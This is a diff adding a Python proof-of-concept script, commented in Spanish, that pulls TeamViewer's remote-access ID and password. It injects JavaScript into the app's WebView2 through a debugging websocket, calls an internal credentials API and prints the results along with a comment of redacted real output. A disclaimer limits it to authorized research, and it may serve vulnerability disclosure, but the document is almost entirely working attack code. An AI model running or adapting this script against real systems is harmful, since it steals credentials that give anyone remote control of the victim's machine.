@@ -1,0 +1,47 @@
+"""
+teamviewer_credential_extraction.py -- Extraccion de credenciales
+Obtiene la contrasena de acceso remoto y el ID de TeamViewer.
+ADVERTENCIA: Solo para investigacion autorizada.
+"""
+import websocket
+import json
+
+def extract_remote_credentials(ws):
+    """Extraer contrasena de acceso remoto via API interna."""
+    # Ejecutar fetch() en el contexto del WebView2
+    js_code = """
+    (async () => {
+        const resp = await fetch(
+            'https://teamviewer-internal-<HASH>/api/mydevice/v1/credentials/idpassword'
+        );
+        const data = await resp.json();
+        return JSON.stringify(data);
+    })()
+    """
+
+    ws.send(json.dumps({
+        "id": 10,
+        "method": "Runtime.evaluate",
+        "params": {
+            "expression": js_code,
+            "awaitPromise": True
+        }
+    }))
+
+    result = json.loads(ws.recv())
+    creds = json.loads(
+        result["result"]["result"]["value"]
+    )
+
+    print("[!] CREDENCIALES DE ACCESO REMOTO EXTRAIDAS:")
+    print(f"    TeamViewer ID: {creds.get('teamviewerId', 'N/A')}")
+    print(f"    Password:      {creds.get('password', 'N/A')}")
+    print()
+    print("[!] Con estos datos, cualquier persona puede")
+    print("    conectarse remotamente a esta maquina.")
+
+    return creds
+
+# Output real (redactado):
+# TeamViewer ID: <TV_ID_REDACTED>
+# Password:      <PASSWORD_REDACTED>
